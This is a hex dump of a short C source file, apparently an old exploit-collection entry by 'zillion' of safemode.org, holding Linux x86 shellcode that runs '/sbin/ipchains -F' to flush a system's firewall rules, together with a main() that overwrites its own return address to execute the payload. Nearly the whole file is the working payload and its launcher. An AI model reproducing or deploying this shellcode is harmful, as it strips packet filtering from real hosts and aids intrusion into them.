00000000  41 75 74 68 6f 72 3a 20  7a 69 6c 6c 69 6f 6e 0d  |Author: zillion.|
00000010  0a 45 6d 61 69 6c 3a 20  7a 69 6c 6c 69 6f 6e 40  |.Email: zillion@|
00000020  73 61 66 65 6d 6f 64 65  2e 6f 72 67 0d 0a 48 6f  |safemode.org..Ho|
00000030  6d 65 70 61 67 65 3a 20  68 74 74 70 3a 2f 2f 77  |mepage: http://w|
00000040  77 77 2e 73 61 66 65 6d  6f 64 65 2e 6f 72 67 0d  |ww.safemode.org.|
00000050  0a 0d 0a 0d 0a 4c 69 6e  75 78 20 78 38 36 20 73  |.....Linux x86 s|
00000060  68 65 6c 6c 20 63 6f 64  65 20 74 68 61 74 20 64  |hell code that d|
00000070  6f 65 73 20 61 6e 20 65  78 65 63 76 65 20 6f 66  |oes an execve of|
00000080  20 2f 73 62 69 6e 2f 69  70 63 68 61 69 6e 73 20  | /sbin/ipchains |
00000090  2d 46 0d 0a 0d 0a 0d 0a  46 69 6c 65 20 6e 61 6d  |-F......File nam|
000000a0  65 3a 20 66 6c 75 73 68  2d 69 70 63 68 61 69 6e  |e: flush-ipchain|
000000b0  73 2d 73 68 65 6c 6c 63  6f 64 65 2e 63 0d 0a 0d  |s-shellcode.c...|
000000c0  0a 0d 0a 2f 2a 0d 0a 20  2a 20 54 68 69 73 20 73  |.../*.. * This s|
000000d0  68 65 6c 6c 63 6f 64 65  20 77 69 6c 6c 20 64 6f  |hellcode will do|
000000e0  20 2f 73 62 69 6e 2f 69  70 63 68 61 69 6e 73 20  | /sbin/ipchains |
000000f0  2d 46 0d 0a 20 2a 20 57  72 69 74 74 65 6e 20 62  |-F.. * Written b|
00000100  79 20 7a 69 6c 6c 69 6f  6e 40 73 61 66 65 6d 6f  |y zillion@safemo|
00000110  64 65 2e 6f 72 67 0d 0a  20 2a 0d 0a 20 2a 2f 0d  |de.org.. *.. */.|
00000120  0a 0d 0a 63 68 61 72 20  73 68 65 6c 6c 63 6f 64  |...char shellcod|
00000130  65 5b 5d 3d 0d 0a 20 20  20 20 20 20 20 20 22 5c  |e[]=..        "\|
00000140  78 65 62 5c 78 32 31 5c  78 35 65 5c 78 33 31 5c  |xeb\x21\x5e\x31\|
00000150  78 63 30 5c 78 38 38 5c  78 34 36 5c 78 30 65 5c  |xc0\x88\x46\x0e\|
00000160  78 38 38 5c 78 34 36 5c  78 31 31 5c 78 38 39 5c  |x88\x46\x11\x89\|
00000170  78 37 36 5c 78 31 32 5c  78 38 64 22 0d 0a 20 20  |x76\x12\x8d"..  |
00000180  20 20 20 20 20 20 22 5c  78 35 65 5c 78 30 66 5c  |      "\x5e\x0f\|
00000190  78 38 39 5c 78 35 65 5c  78 31 36 5c 78 38 39 5c  |x89\x5e\x16\x89\|
000001a0  78 34 36 5c 78 31 61 5c  78 62 30 5c 78 30 62 5c  |x46\x1a\xb0\x0b\|
000001b0  78 38 39 5c 78 66 33 5c  78 38 64 5c 78 34 65 5c  |x89\xf3\x8d\x4e\|
000001c0  78 31 32 22 0d 0a 20 20  20 20 20 20 20 20 22 5c  |x12"..        "\|
000001d0  78 38 64 5c 78 35 36 5c  78 31 61 5c 78 63 64 5c  |x8d\x56\x1a\xcd\|
000001e0  78 38 30 5c 78 65 38 5c  78 64 61 5c 78 66 66 5c  |x80\xe8\xda\xff\|
000001f0  78 66 66 5c 78 66 66 5c  78 32 66 5c 78 37 33 5c  |xff\xff\x2f\x73\|
00000200  78 36 32 5c 78 36 39 5c  78 36 65 22 0d 0a 20 20  |x62\x69\x6e"..  |
00000210  20 20 20 20 20 20 22 5c  78 32 66 5c 78 36 39 5c  |      "\x2f\x69\|
00000220  78 37 30 5c 78 36 33 5c  78 36 38 5c 78 36 31 5c  |x70\x63\x68\x61\|
00000230  78 36 39 5c 78 36 65 5c  78 37 33 5c 78 33 38 5c  |x69\x6e\x73\x38\|
00000240  78 32 64 5c 78 34 36 5c  78 33 32 5c 78 33 33 5c  |x2d\x46\x32\x33\|
00000250  78 33 34 22 0d 0a 20 20  20 20 20 20 20 20 22 5c  |x34"..        "\|
00000260  78 33 35 5c 78 33 36 5c  78 33 37 5c 78 33 38 5c  |x35\x36\x37\x38\|
00000270  78 33 39 5c 78 36 31 5c  78 36 32 5c 78 36 33 5c  |x39\x61\x62\x63\|
00000280  78 36 34 5c 78 36 35 22  3b 0d 0a 0d 0a 0d 0a 69  |x64\x65";......i|
00000290  6e 74 20 6d 61 69 6e 28  29 0d 0a 7b 0d 0a 0d 0a  |nt main()..{....|
000002a0  20 20 69 6e 74 20 2a 72  65 74 3b 0d 0a 20 20 72  |  int *ret;..  r|
000002b0  65 74 20 3d 20 28 69 6e  74 20 2a 29 26 72 65 74  |et = (int *)&ret|
000002c0  20 2b 20 32 3b 0d 0a 20  20 28 2a 72 65 74 29 20  | + 2;..  (*ret) |
000002d0  3d 20 28 69 6e 74 29 73  68 65 6c 6c 63 6f 64 65  |= (int)shellcode|
000002e0  3b 0d 0a 7d 0d 0a 0d 0a  2d 2d                    |;..}....--|
000002ea
